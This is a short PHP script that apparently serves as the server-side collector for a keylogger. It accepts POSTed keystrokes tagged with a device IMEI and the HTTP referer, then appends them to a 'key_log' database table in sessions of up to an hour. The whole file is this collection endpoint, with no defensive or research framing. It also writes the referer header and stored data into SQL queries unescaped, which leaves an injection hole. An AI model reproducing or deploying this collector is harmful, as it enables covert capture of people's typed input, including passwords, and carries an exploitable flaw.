<?php

include 'crypt.php';
include 'db.php';


//mysql_connect($db_host, $db_user, $db_pass); 
//mysql_select_db($db_name); 
//$table = "logs"; 
if($_SERVER['REQUEST_METHOD']=='POST') { //form handler part: 
	$key = $mysqli->real_escape_string($_POST['inp']);
	$data = "";
	$id = "";
	$time = "";
	// start first querry to get previous info
	$query = "SELECT * FROM `key_log` WHERE IMEI='".$mysqli->real_escape_string($_POST['imei'])."'";
	$result = $mysqli->query($query) or die("Invalid query: " . mysql_error()); 
	if ($result) {
		while ($row = mysqli_fetch_assoc($result)) {
			$id = $row['id'];
			$imei = $row['IMEI'];
	    	$data = $row['data'];
	    	$time = $row['date'];
	    	$referer = $row['referer'];
		}
	}
	if (isset($id) and  (time()-$time <= 3600) and ($referer == $_SERVER['HTTP_REFERER'])) {
		//mysql_free_result($result);
		$data.=$key;
		$query = "UPDATE `key_log` SET data='$data' WHERE id='$id'";
		$result = $mysqli->query($query) or die("Invalid query: " . mysql_error()); 
	} else {
		$query="INSERT INTO `key_log` SET data='".$key."', date='".time()."', referer='".$_SERVER['HTTP_REFERER']."', IMEI='".$mysqli->real_escape_string($_POST['imei'])."'"; 
		//mysql_free_result($result);
		$result = $mysqli->query($query) or die("Invalid query: " . mysql_error()); 
	}
}

?>
